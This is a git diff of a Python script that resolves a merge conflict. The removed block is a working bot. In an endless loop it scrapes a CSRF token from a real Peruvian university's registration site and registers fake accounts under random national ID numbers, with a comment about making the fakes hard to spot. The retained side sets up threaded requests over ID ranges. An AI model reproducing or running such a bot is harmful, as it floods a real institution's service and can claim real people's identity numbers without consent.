@@ -18,31 +18,6 @@ headers = {
 }
 
 
-<<<<<<< HEAD
-while True :
-    r = requests.get("http://www.inscripciones.uni.edu.pe/login");
-    text = r.text
-    soup = BeautifulSoup(text , features = "lxml").body
-    token = soup.find_all('input')[0]['value']
-    dni_str = "7"+str(random.randint(1000000,9999999)) # people from Peru now have a ID starting with 7
-    password = str(random.randint(10000000,99999999)) # Making difficult to find wich one is fake
-    data = {
-        '_token':token,
-        'dni': dni_str,
-        'password': password,
-        'password_confirmation': password
-    }
-    try:
-        r = requests.post('http://www.inscripciones.uni.edu.pe/register', data = data, headers=headers, cookies=r.cookies)
-    except ValueError:
-        print("Error: retrying http post")
-        time.sleep(3)
-    #if dni%50==0:
-    print(str(dni_str)+":"+ "Ok" if r.status_code==200 else "Error")
-    """with open("lastOne.txt","w") as f:
-            f.write(str(dni))"""
-    #dni+=1
-=======
 
 cont = 0
 def make_request(hilo,left,right):
@@ -99,4 +74,3 @@ for i in range(Nhilos):
     hilos[i].join()
 
 print("Proceso terminado :|")
->>>>>>> 93f1526411a78adc4784befc3d79910edcd02d93
